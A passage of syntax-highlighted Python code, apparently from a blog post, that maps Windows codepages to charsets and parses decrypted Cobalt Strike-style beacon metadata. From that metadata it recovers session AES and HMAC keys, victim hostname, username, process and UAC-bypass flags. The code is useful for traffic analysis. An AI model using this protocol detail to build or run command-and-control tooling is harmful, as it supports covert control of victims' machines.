class="string">&quot;x-mswin-936&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-windows-949&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">950</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Big5&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1026</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM1026&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1047</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM1047&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1140</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01140&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1141</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01141&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1142</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01142&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1143</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01143&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1144</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01144&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1145</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01145&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1146</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01146&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1147</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01147&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1148</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01148&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1149</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01149&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-16LE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1201</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-16BE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1250</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1250&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1251</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1251&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1252</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1252&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1253</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1253&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1254</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1254&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1255</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1255&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1256</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1256&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1257</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1257&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1258</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1258&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1361</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-Johab&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacRoman&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacArabic&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacHebrew&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10006</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacGreek&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10007</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCyrillic&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10008</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10010</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacRomania&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10017</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacUkraine&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10021</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacThai&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10029</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCentralEurope&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10079</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacIceland&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10081</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacTurkish&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10082</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCroatian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">12000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-32LE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">12001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-32BE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISO-2022-CN-CNS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20105</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20106</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20107</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20108</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20127</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;US-ASCII&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20261</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20269</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20273</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM273&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20277</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM277&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20278</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM278&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20280</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM280&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20284</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM284&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20285</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM285&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20290</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM290&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20297</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM297&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20420</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM420&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20423</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20424</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM424&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20833</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20838</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM-Thai&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KOI8-R&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20871</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM871&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20880</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20905</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20924</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21025</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM1025&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21027</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KOI8-U&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28591</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28592</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28593</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-3&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28594</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-4&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28595</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-5&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28596</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-6&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28597</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-7&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28598</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-8&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28599</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-9&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28603</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-13&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28605</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-15&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">29001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">38598</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-8&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50220</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50221</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP-2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50222</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50225</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-KR&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50227</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-CN&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50229</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-CN&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50930</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM930&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50931</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50933</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM933&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50935</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM935&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50937</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM937&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50939</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM939&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-KR&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51950</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">52936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">54936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB18030&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57006</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57007</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57008</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57009</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57010</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57011</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">65000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">65001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> plaintext[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 16</span></span><br><span class="line">    raw_aes_keys = plaintext[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var9 = plaintext[<span class="number">24</span>:<span class="number">26</span>]</span><br><span class="line">    var9 = <span class="built_in">int</span>.from_bytes(var9, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var9 = getName(var9)</span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var10 = plaintext[<span class="number">26</span>:<span class="number">28</span>]</span><br><span class="line">    var10 = <span class="built_in">int</span>.from_bytes(var10, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var10 = getName(var10)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    <span class="built_in">id</span> = plaintext[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">int</span>.from_bytes(<span class="built_in">id</span>, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Beacon id:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    pid = plaintext[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">    pid = <span class="built_in">int</span>.from_bytes(pid, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pid:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pid))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    port = plaintext[<span class="number">36</span>:<span class="number">38</span>]</span><br><span class="line">    port = <span class="built_in">int</span>.from_bytes(port, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    flag = plaintext[<span class="number">38</span>:<span class="number">39</span>]</span><br><span class="line">    flag = <span class="built_in">int</span>.from_bytes(flag, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">1</span>):</span><br><span class="line">        barch = <span class="string">&quot;&quot;</span></span><br><span class="line">        pid = <span class="string">&quot;&quot;</span></span><br><span class="line">        is64 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> isFlag(flag, <span class="number">2</span>):</span><br><span class="line">        barch = <span class="string">&quot;x64&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        barch = <span class="string">&quot;x86&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">4</span>):</span><br><span class="line">        is64 = <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        is64 = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">8</span>):</span><br><span class="line">        bypassuac = <span class="string">&quot;True&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bypassuac = <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;barch:&quot;</span> + barch)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;is64:&quot;</span> + is64)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bypass:&quot;</span> + bypassuac)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var_1 = plaintext[<span class="number">39</span>:<span class="number">40</span>]</span><br><span class="line">    var_2 = plaintext[<span class="number">40</span>:<span class="number">41</span>]</span><br><span class="line">    var_1 = <span class="built_in">int</span>.from_bytes(var_1, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var_2 = <span class="built_in">int</span>.from_bytes(var_2, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    windows_var = <span class="built_in">str</span>(var_1) + <span class="string">&quot;.&quot;</span> + <span class="built_in">str</span>(var_2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;windows var:&quot;</span> + windows_var)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    windows_build = plaintext[<span class="number">41</span>:<span class="number">43</span>]</span><br><span class="line">    windows_build = <span class="built_in">int</span>.from_bytes(windows_build, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;windows build:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(windows_build))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    x64_P = plaintext[<span class="number">43</span>:<span class="number">47</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    ptr_gmh = plaintext[<span class="number">47</span>:<span class="number">51</span>]</span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    ptr_gpa = plaintext[<span class="number">51</span>:<span class="number">55</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if (&quot;x64&quot;.equals(this.barch)) &#123;</span></span><br><span class="line">    <span class="comment"># this.ptr_gmh = CommonUtils.join(var10, this.ptr_gmh)</span></span><br><span class="line">    <span class="comment"># this.ptr_gpa = CommonUtils.join(var10, this.ptr_gpa)</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># this.ptr_gmh = CommonUtils.bswap(this.ptr_gmh)</span></span><br><span class="line">    <span class="comment"># this.ptr_gpa = CommonUtils.bswap(this.ptr_gpa)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    intz = plaintext[<span class="number">55</span>:<span class="number">59</span>]</span><br><span class="line">    intz = <span class="built_in">int</span>.from_bytes(intz, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    intz = toIP(intz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> intz == <span class="string">&quot;0.0.0.0&quot;</span>:</span><br><span class="line">        intz = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;host:&quot;</span> + intz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> var9 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        ddata = plaintext[<span class="number">59</span>:].decode(<span class="string">&quot;ISO8859-1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ddata = plaintext[<span class="number">59</span>:].decode(<span class="string">&quot;ISO8859-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ddata = ddata.split(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">0</span>:</span><br><span class="line">        computer = ddata[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">1</span>:</span><br><span class="line">        username = ddata[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">2</span>:</span><br><span class="line">        process = ddata[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PC name:&quot;</span> + computer)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;username:&quot;</span> + username)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;process name:&quot;</span> + process)</span><br><span class="line"></span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES 